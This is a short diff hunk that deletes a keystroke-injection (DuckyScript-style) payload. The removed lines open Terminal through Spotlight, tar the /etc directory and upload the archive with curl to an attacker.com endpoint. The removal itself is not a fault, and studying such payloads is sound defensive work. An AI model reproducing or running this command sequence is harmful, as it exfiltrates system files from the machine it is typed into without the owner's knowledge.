@@ -1,8 +1,0 @@
-DELAY 1000
-GUI SPACE
-DELAY 500
-STRING Terminal
-ENTER
-DELAY 500
-STRING tar -cvf sensitive_data.tar /etc && curl -F "file=@sensitive_data.tar" https://attacker.com/upload
-ENTER
